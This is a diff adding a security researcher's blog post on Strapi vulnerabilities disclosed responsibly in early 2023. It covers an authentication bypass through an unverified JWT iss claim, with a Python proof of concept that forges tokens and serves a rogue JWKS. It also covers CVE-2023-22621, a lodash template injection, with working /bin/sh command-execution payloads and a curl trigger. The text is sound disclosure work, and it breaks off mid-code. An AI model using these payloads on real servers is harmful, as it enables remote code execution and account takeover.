+<span class="w">      </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">idToken</span><span class="p">,</span><span class="w"> </span><span class="nx">pem</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">algorithms</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">'RS256'</span><span class="p">]</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">decodedToken</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="nx">reject</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="nx">resolve</span><span class="p">(</span><span class="nx">decodedToken</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">});</span><span class="w"></span>
+<span class="w">    </span><span class="p">});</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">decodedToken</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">'There was an error verifying the token'</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ <strong>
+  However, the above fix was also vulnerable to authentication bypass!
+ </strong>
+</p>
+<p>
+ The developer tried to fix the vulnerability by using the
+ <strong>
+  <code>
+   iss
+  </code>
+ </strong>
+ claim within the JWT to get the URL location to download the public key. However, the
+ <code>
+  iss
+ </code>
+ claim was
+ <strong>
+  never verified
+ </strong>
+ before being used to download the JWKS file. Therefore, an attacker can modify this claim so the server sends a request to an attacker-controlled server instead. This type of vulnerability is known as a Server-Side Request Forgery (SSRF), and in this use case can be exploited trick the Strapi server verify a forged JWT token using a JWKS from the attacker's website.
+</p>
+<p>
+ I immediately pointed out the security vulnerability that I noticed by reviewing the source code and followed with the below POC and GIF. The POC will first generate a RSA keyset that is then used to sign a forged JWT and start a web server that will respond with the corresponding JWKS file for the forged JWT.
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">from</span> <span class="nn">jwcrypto</span> <span class="kn">import</span> <span class="n">jwk</span><span class="p">,</span> <span class="n">jwt</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">SimpleHTTPRequestHandler</span>
+<span class="kn">import</span> <span class="nn">socketserver</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="n">jwk</span><span class="o">.</span><span class="n">JWK</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">kty</span><span class="o">=</span><span class="s1">'RSA'</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">2048</span><span class="p">,</span> <span class="n">alg</span><span class="o">=</span><span class="s1">'RS256'</span><span class="p">,</span> <span class="n">use</span><span class="o">=</span><span class="s1">'sig'</span><span class="p">,</span> <span class="n">kid</span><span class="o">=</span><span class="s1">'1234authbypass'</span><span class="p">)</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_public</span><span class="p">(</span><span class="n">as_dict</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">private_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_private</span><span class="p">()</span>
+
+<span class="n">jwks_key</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"keys"</span><span class="p">:[</span><span class="n">public_key</span><span class="p">]})</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">"cognito:username"</span><span class="p">:</span> <span class="s2">"auth-bypass-example"</span><span class="p">,</span>
+    <span class="s2">"email"</span><span class="p">:</span> <span class="s2">"ghostccamm@testvm.local"</span><span class="p">,</span>
+    <span class="s2">"iss"</span><span class="p">:</span> <span class="s2">"http://192.168.122.254/exploit"</span>
+<span class="p">}</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">JWT</span><span class="p">(</span>
+    <span class="n">header</span><span class="o">=</span><span class="p">{</span><span class="s2">"alg"</span><span class="p">:</span> <span class="s2">"RS256"</span><span class="p">,</span> <span class="s2">"kid"</span><span class="p">:</span> <span class="s2">"1234authbypass"</span><span class="p">},</span>
+    <span class="n">claims</span><span class="o">=</span><span class="n">payload</span>
+<span class="p">)</span>
+
+<span class="n">token</span><span class="o">.</span><span class="n">make_signed_token</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Auth Bypass Token: </span><span class="si">{</span><span class="n">token</span><span class="o">.</span><span class="n">serialize</span><span class="p">()</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">JWKSHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">protocol_version</span> <span class="o">=</span> <span class="s1">'HTTP/1.1'</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="s1">'OK'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">,</span> <span class="s1">'application/json'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">jwks_key</span><span class="p">)</span>
+
+
+<span class="k">with</span> <span class="n">socketserver</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s2">""</span><span class="p">,</span> <span class="mi">80</span><span class="p">),</span> <span class="n">JWKSHandler</span><span class="p">)</span> <span class="k">as</span> <span class="n">httpd</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Running Web Server to Server JWKS"</span><span class="p">)</span>
+    <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre>
+</div>
+<p>
+ In the following GIF, you can see that my test Strapi server uses the unvalidated
+ <code>
+  iss
+ </code>
+ claim to download the JWKS file that the POC generates and successfully verifies the forged JWT and bypasses authentication.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/fix-bypass.gif"/>
+</p>
+<p>
+ The Strapi developer immediately updated the code to use a JWKS url setting that is configured on the admin panel that mitigates the risk of this vulnerability being exploited (major kudos for the fast fix). It does not completely eliminate the risk, since a
+ <a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications">
+  Prototype Pollution vulnerability
+ </a>
+ could exist in the future that can be exploited to change this configuration setting; but this risk is unavoidable because Strapi is built using JavaScript.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455">
+ CVE-2023-22621: SSTI to RCE by Exploiting Email Templates in Strapi Versions &lt;=4.5.5
+</h1>
+<p>
+ The first vulnerability I discovered when I started reviewing Strapi's code was a
+ <strong>
+  critical Server-Side Template Injection (SSTI) vulnerability
+ </strong>
+ that can be exploited to
+ <strong>
+  execute arbitrary code on the server
+ </strong>
+ . If you had super administrator access, you can inject a malicious payload into an email template that bypasses the validation function
+ <code>
+  isValidEmailTemplate
+ </code>
+ (file
+ <a href="https://github.com/strapi/strapi/blob/v4.5.5/packages/plugins/users-permissions/server/controllers/validation/email-template.js">
+  @strapi/plugin-users-permissions/server/controllers/validation/email-template.js
+ </a>
+ ) that exploits a SSTI vulnerability in
+ <code>
+  sendTemplatedEmail
+ </code>
+ (file
+ <a href="https://github.com/strapi/strapi/blob/v4.5.5/packages/core/email/server/services/email.js">
+  @strapi/plugin-email/server/services/email.js
+ </a>
+ ). The function
+ <code>
+  sendTemplatedEmail
+ </code>
+ renders email templates into HTML content using the
+ <code>
+  lodash
+ </code>
+ template engine that
+ <strong>
+  evaluates JavaScript code within templates
+ </strong>
+ . In addition, an attacker can exploit
+ <strong>
+  CVE-2023-22894
+ </strong>
+ to gain
+ <strong>
+  super administrator access as an unauthenticated user and then achieve RCE by exploiting this vulnerability
+ </strong>
+ .
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="tldr-vulnerability-details_1">
+ TL;DR Vulnerability Details
+</h2>
+<ul>
+ <li>
+  <strong>
+   CVE:
+  </strong>
+  CVE-2023-22621
+ </li>
+ <li>
+  <strong>
+   CVSS v3.1 Vector:
+  </strong>
+  <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&amp;version=3.1">
+   AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+  </a>
+ </li>
+ <li>
+  <strong>
+   Affected Versions:
+  </strong>
+  &lt;=4.5.5
+ </li>
+ <li>
+  <strong>
+   How to Patch:
+  </strong>
+  Immediately
+  <strong>
+   update
+  </strong>
+  your Strapi to version
+  <strong>
+   &gt;=4.5.6
+  </strong>
+  ! If you using Strapi
+  <strong>
+   3.x.x
+  </strong>
+  or below,
+  <strong>
+   IMMEDIATELY UPDATE TO A PATCHED 4.x.x VERSION!
+  </strong>
+  Strapi versions 3.x.x reached its
+  <strong>
+   end of life support on the December 31st 2022
+  </strong>
+  , and would
+  <strong>
+   not receive a patch
+  </strong>
+  for this vulnerability!
+ </li>
+</ul>
+</div>
+</div>
+</section>
+<section class="wrapper style1 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="vulnerability-disclosure-timeline_1">
+ Vulnerability Disclosure Timeline
+</h2>
+<p>
+ I would like to begin by first highlighting Strapi's professionalism handling this vulnerability disclosure. I have never received a response to one of my security reports
+ <strong>
+  in under 20 minutes
+ </strong>
+ , and this has been my best experience reporting a vulnerability to an organisation
+ <strong>
+  by far
+ </strong>
+ . Derrick from Strapi was transparent with me throughout this process and I want give them personal a shout out for doing vulnerability disclosure correctly.
+</p>
+<p>
+ If your organisation wants to know how to do handle vulnerability disclosure correctly,
+ <strong>
+  please use Strapi as an example on how to respond to security vulnerabilities being reported!
+ </strong>
+</p>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Time
+   </th>
+   <th>
+    Event
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    2022/12/30 00:15 AM UTC
+   </td>
+   <td>
+    Successfully exploited the SSTI vulnerability for the first time.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2022/12/30 02:40 AM UTC
+   </td>
+   <td>
+    Sent the report of the vulnerability to the Strapi team following their security policy.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2022/12/30 02:57 AM UTC
+   </td>
+   <td>
+    Received an initial response from Strapi acknowledging the report (
+    <em>
+     woah that was incredibly fast
+    </em>
+    ).
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2022/12/30 02:12 PM UTC
+   </td>
+   <td>
+    Confirmation from Strapi that they successfully reproduced the vulnerability and provided an estimated 1 week timeline to patch the vulnerability due to the holiday period.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/02 02:39 AM UTC
+   </td>
+   <td>
+    I sent a request to Mitre to reserve a CVE ID for this vulnerability.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/03 08:00 PM UTC
+   </td>
+   <td>
+    Strapi team developed a fix for this vulnerability and released a nightly build for testing the patch.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/05 12:09 AM UTC
+   </td>
+   <td>
+    Mitre reserved CVE ID
+    <code>
+     CVE-2023-22621
+    </code>
+    for this vulnerability.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/08 08:13 AM UTC
+   </td>
+   <td>
+    Identified a minor issue with the patch.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/10 10:00 AM UTC
+   </td>
+   <td>
+    Strapi team fixed the minor issue with the patch.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/11 04:00 PM UTC
+   </td>
+   <td>
+    <a href="https://github.com/strapi/strapi/releases/tag/v4.5.6">
+     Strapi released version
+     <strong>
+      4.5.6
+     </strong>
+    </a>
+    with the patch and announced a security warning for previous versions.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/18 08:05 AM UTC
+   </td>
+   <td>
+    Informed Strapi about a method of exploiting
+    <strong>
+     CVE-2023-22894
+    </strong>
+    to hijack admin accounts, that enables this vulnerability being exploited as an
+    <strong>
+     unauthenticated user
+    </strong>
+    .
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/19 03:08 PM UTC
+   </td>
+   <td>
+    Strapi and I both decided to delay the public disclosure of this vulnerability until
+    <strong>
+     CVE-2023-22894
+    </strong>
+    has been patched.
+   </td>
+  </tr>
+ </tbody>
+</table>
+</div>
+</div>
+</section>
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="reproducing-the-ssti-vulnerability">
+ Reproducing the SSTI Vulnerability
+</h2>
+<p>
+ I used version 4.5.5 of Strapi that was released on the 29th of December 2022 and below is a screenshot of my project setup.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/project-info.png"/>
+</p>
+<p>
+ However, you should be able to reproduce the following steps for all versions of Strapi &lt;=4.5.5. You can even exploit the vulnerability without having email configured, since Strapi will still execute
+ <code>
+  sendTemplatedEmail
+ </code>
+ and attempt to send the email using the default
+ <code>
+  sendmail
+ </code>
+ provider.
+</p>
+<ol>
+ <li>
+  <p>
+   Login with an administrator account and on the admin panel go to Settings &gt; Users &amp; Permissions Plugin &gt; Email templates.
+  </p>
+ </li>
+ <li>
+  <p>
+   Modify the Email address confirmation template and add the following payload (I will explain how it works later in this article). The payload will create a folder at
+   <code>
+    /tmp/strapi-confirm
+   </code>
+   and place a file at
+   <code>
+    /tmp/strapi-confirm/rce
+   </code>
+   when triggered.
+  </p>
+ </li>
+</ol>
+<p>
+ <em>
+  The POC payload
+ </em>
+</p>
+<div class="codehilite">
+ <pre><span></span><code>&lt;%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","mkdir /tmp/strapi-confirm; touch /tmp/strapi-confirm/rce"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*&lt;&gt;%=*/}]}).output }` %&gt;
+</code></pre>
+</div>
+<p>
+ Place the POC payload into the Email Address Confirmation Template and save it.
+</p>
+<p>
+ <em>
+  Modifying the Email Address Confirmation Template
+ </em>
+ <br/>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/email-template-payload.png"/>
+</p>
+<p>
+ <em>
+  The POC Payload Bypasses the
+  <code>
+   isValidEmailTemplate
+  </code>
+  and saves it
+ </em>
+ <br/>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/bypass-email-validation.png"/>
+</p>
+<ol start="3">
+ <li>
+  <p>
+   Navigate to Settings &gt; Users &amp; Permissions Plugin &gt; Advanced settings and enable email confirmation. This will trigger the payload when a new user registers. However, you can also exploit the vulnerability by modifying the password reset template and trigger it by using the forgot password feature.
+  </p>
+ </li>
+ <li>
+  <p>
+   Register a new user using the API to trigger executing the email template with the POC. For an example, I am used local authentication and the following
+   <code>
+    curl
+   </code>
+   command to register a new API user.
+  </p>
+ </li>
+</ol>
+<div class="codehilite">
+ <pre><span></span><code>curl -X POST -H <span class="s1">'Content-Type: application/json'</span> -d <span class="s1">'{"email":"rcetrigger@testvm.local", "username":"rcetrigger", "password": "Super top secret to demo RCE!!1"}'</span> http://testvm.local:1337/api/auth/local/register
+</code></pre>
+</div>
+<ol start="5">
+ <li>
+  On the server, navigate to
+  <code>
+   /tmp
+  </code>
+  and see that a folder name
+  <code>
+   strapi-confirm
+  </code>
+  was created with a file named
+  <code>
+   rce
+  </code>
+  inside.
+ </li>
+</ol>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/rce-confirmation.png"/>
+</p>
+<p>
+ Finally for dramatic effect, the below gif shows me popping a reverse shell on my test VM by exploiting the SSTI vulnerability.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/strapi-rce-reverse-shell.gif"/>
+</p>
+<p>
+ <em>
+  Seems pretty simple?
+ </em>
+</p>
+<p>
+ Well actually finding a working exploit was quite the fun challenge! The following section will explain my process of discovering this vulnerability and how the POC bypasses the validation function
+ <code>
+  isValidEmailTemplate
+ </code>
+ .
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="discovering-and-exploiting-this-vulnerability">
+ Discovering and Exploiting this Vulnerability
+</h2>
+<p>
+ To understand how I discovered and exploited the SSTI vulnerability in Strapi, I need to breakdown the different aspects when put together resulted in a successful exploit.
+</p>
+<h3 class="major" id="exploiting-lodash-template-injection">
+ Exploiting Lodash Template Injection
+</h3>
+<p>
+ When I started reviewing Strapi, one of the first things that immediately caught my attention was the use of the
+ <code>
+  lodash
+ </code>
+ template engine in
+ <code>
+  sendTemplatedEmail
+ </code>
+ (source code shown below).
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="s1">'use strict'</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'lodash'</span><span class="p">);</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">getProviderSettings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">strapi</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'plugin.email'</span><span class="p">);</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">options</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">strapi</span><span class="p">.</span><span class="nx">plugin</span><span class="p">(</span><span class="s1">'email'</span><span class="p">).</span><span class="nx">provider</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">options</span><span class="p">);</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="cm">/**</span>
+<span class="cm"> * fill subject, text and html using lodash template</span>
+<span class="cm"> * @param {object} emailOptions - to, from and replyto...</span>
+<span class="cm"> * @param {object} emailTemplate - object containing attributes to fill</span>
+<span class="cm"> * @param {object} data - data used to fill the template</span>
+<span class="cm"> * @returns {{ subject, text, subject }}</span>
+<span class="cm"> */</span><span class="w"></span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">sendTemplatedEmail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">emailOptions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{},</span><span class="w"> </span><span class="nx">emailTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{},</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">attributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">'subject'</span><span class="p">,</span><span class="w"> </span><span class="s1">'text'</span><span class="p">,</span><span class="w"> </span><span class="s1">'html'</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">missingAttributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_</span><span class="p">.</span><span class="nx">difference</span><span class="p">(</span><span class="nx">attributes</span><span class="p">,</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">emailTemplate</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">missingAttributes</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="w"></span>
+<span class="w">      </span><span class="sb">`Following attributes are missing from your email template : </span><span class="si">${</span><span class="nx">missingAttributes</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="w"></span>
+<span class="w">    </span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">templatedAttributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">attributes</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="w"></span>
+<span class="w">    </span><span class="p">(</span><span class="nx">compiled</span><span class="p">,</span><span class="w"> </span><span class="nx">attribute</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"></span>
+<span class="w">      </span><span class="nx">emailTemplate</span><span class="p">[</span><span class="nx">attribute</span><span class="p">]</span><span class="w"></span>
+<span class="w">        </span><span class="o">?</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">compiled</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">attribute</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="nx">_</span><span class="p">.</span><span class="nx">template</span><span class="p">(</span><span class="nx">emailTemplate</span><span class="p">[</span><span class="nx">attribute</span><span class="p">])(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">})</span><span class="w"></span>
+<span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="nx">compiled</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="p">{}</span><span class="w"></span>
+<span class="w">  </span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">strapi</span><span class="p">.</span><span class="nx">plugin</span><span class="p">(</span><span class="s1">'email'</span><span class="p">).</span><span class="nx">provider</span><span class="p">.</span><span class="nx">send</span><span class="p">({</span><span class="w"> </span><span class="p">...</span><span class="nx">emailOptions</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="nx">templatedAttributes</span><span class="w"> </span><span class="p">});</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span><span class="w"></span>
+<span class="w">  </span><span class="nx">getProviderSettings</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nx">send</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nx">sendTemplatedEmail</span><span class="p">,</span><span class="w"></span>
+<span class="p">});</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ I was unfamiliar with using or exploiting the
+ <code>
+  lodash
+ </code>
+ template engine, but reading the
+ <a href="https://lodash.com/docs/4.17.15#template">
+  documentation
+ </a>
+ I realised that the template engine can
+ <strong>
+  evaluate JavaScript code on the server
+ </strong>
+ ! I also
+ <a href="https://twitter.com/rootxharsh/status/1268181937127997446?lang=en">
+  found this tweet
+ </a>
+ that contains the following payload that can exploit
+ <code>
+  lodash
+ </code>
+ SSTI vulnerabilities to execute arbitrary commands.
+</p>
+<div class="codehilite">
+ <pre><span></span><code>&lt;%= ${x=Object}${w=a=new x}${w.type="pipe"}${w.readable=1}${w.writable=1}${a.file="/bin/sh"}${a.args=["/bin/sh","-c","id"]}${a.stdio=[w,w]}${process.binding("spawn_sync").spawn(a).output} %&gt;
+</code></pre>
+</div>
+<p>
+ Now that payload looks a little bit confusing, so lets break it down to understand how it works:
+</p>
+<ul>
+ <li>
+  <p>
+   The payload creates two empty objects named
+   <code>
+    w
+   </code>
+   and
+   <code>
+    x
+   </code>
+   (
+   <code>
+    ${x=Object}${w=a=new x}
+   </code>
+   ).
+  </p>
+ </li>
+ <li>
+  <p>
+   The
+   <code>
+    w
+   </code>
+   is then assigned the
+   <code>
+    readable
+   </code>
+   and
+   <code>
+    writable
+   </code>
+   attributes that both have a value of
+   <code>
+    1
+   </code>
+   and the attribute
+   <code>
+    type
+   </code>
+   to
+   <code>
+    pipe
+   </code>
+   to pipe the output of the command that would be executed (
+   <code>
+    ${w.type="pipe"}${w.readable=1}${w.writable=1}
+   </code>
+   ).
+  </p>
+ </li>
+ <li>
+  <p>
+   Then
+   <code>
+    a
+   </code>
+   is assigned the following attributes and used as the input parameter for
+   <code>
+    process.binding("spawn_sync").spawn
+   </code>
+   that starts a new process and waits until completion.
+  </p>
+ </li>
+</ul>
+<div class="codehilite">
+ <pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">file</span><span class="o">:</span><span class="w"> </span><span class="s2">"/bin/sh"</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nx">args</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"id"</span><span class="p">],</span><span class="w"></span>
+<span class="w">    </span><span class="nx">stdio</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="s2">"type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"pipe"</span><span class="p">,</span><span class="w"> </span><span class="s2">"readable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="s2">"writable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="s2">"type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"pipe"</span><span class="p">,</span><span class="w"> </span><span class="s2">"readable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="s2">"writable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">]</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ So that is a neat payload to get RCE by exploiting a
+ <code>
+  lodash
+ </code>
+ SSTI vulnerability. However, when I attempted to use that payload I kept on getting this weird error.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/error-something-broke.png"/>
+</p>
+<p>
+ Looking at the request and response using BurpSuite, I realised that email templates were being validated and my payload was being rejected somewhere.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/you-shall-not-pass-the-validation.png"/>
+</p>
+<p>
+ Searching for the keyword "Invalid template", I found the
+ <code>
+  isValidEmailTemplate
+ </code>
+ function that was not letting me pass my payload :(
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/ushallnotpass-train.gif"/>
+</p>
+<h3 class="major" id="bypassing-the-email-template-validation-check">
+ Bypassing the Email Template Validation Check
+</h3>
+<p>
+ Below is the source code for
+ <code>
+  isValidEmailTemplate
+ </code>
+ that was rejecting the original SSTI payload that I simply copied and pasted.
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="s1">'use strict'</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'lodash'</span><span class="p">);</span><span class="w"></span>
+
